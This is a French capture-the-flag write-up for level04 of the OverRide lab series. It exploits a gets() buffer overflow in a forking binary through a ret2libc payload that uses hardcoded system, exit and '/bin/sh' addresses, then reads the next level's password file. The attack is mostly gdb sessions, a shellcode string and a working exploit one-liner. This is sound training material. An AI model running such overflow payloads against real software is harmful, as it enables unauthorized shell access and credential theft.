#### Etape 1 : Décompilation 
```bash
level04@OverRide:~$ ./level04 
Give me some shellcode, k
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
child is exiting...
level04@OverRide:~$ ./level04 
Give me some shellcode, k
A
child is exiting...
level04@OverRide:~$ 
```

Le binaire demande un SHELLCODE.

#### Etape 2 : Recherche de faille

On analyse le code grace a gdb et ghidra et on detecte une vulmerabilité de type buffer overflow au niveau de la fonction gets.

```c
 gets((char *)local_a0);
 ```
```bash
The gets() function cannot be used securely.  Because of
     its lack of bounds checking, and the inability for the
     calling program to reliably determine the length of the
     next incoming line, the use of this function enables
     malicious users to arbitrarily change a running program's
     functionality through a buffer overflow attack.
```

Nous voyons aussi que le binaire nous envoie dans un child grace a la fonction fork.

#### Etape 3 : Idée

Utilisons la facon red2libc pour executer un shellcode.

premierement nous allons trouver l'adresse de la fonction system et de la fonction exit.

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find __libc_start_main,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```
0xf7f897ec /bin/sh
0xf7e5eb70 exit 
0xf7e6aed0 system

deuxiemement nous avons trouver un overide de 156 octets pour ecraser l'adresse de retour et mettre l'adresse de system et exit.
 ```bash
(gdb) run
Starting program: /home/users/level04/level04 
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()
```

Vu que la fonction gets() est appelée, par le child nous allos devoir utiliser la commande set follow-fork-mode child dans gdb pour suivre le child et trouver le buffer overflow.

```bash
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level04/level04 

Breakpoint 1, 0x080486cd in main ()
(gdb) set follow-fork-mode child
(gdb) c
Continuing.
[New process 1673]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1673]
0x41326641 in ?? ()
```
nous voyons que notre adresse de retour est 0x41326641 et grace au site https://wiremask.eu/tools/buffer-overflow-pattern-generator/? bytes=156 nous trouvons que l'adresse de retour est a 156 octets.

#### Etape 4 : Execution 

```bash
level04@OverRide:~$ echo `python -c 'print "a" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'` > /tmp/koa
level04@OverRide:~$ (cat /tmp/koa; cat ) | ./level04 
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

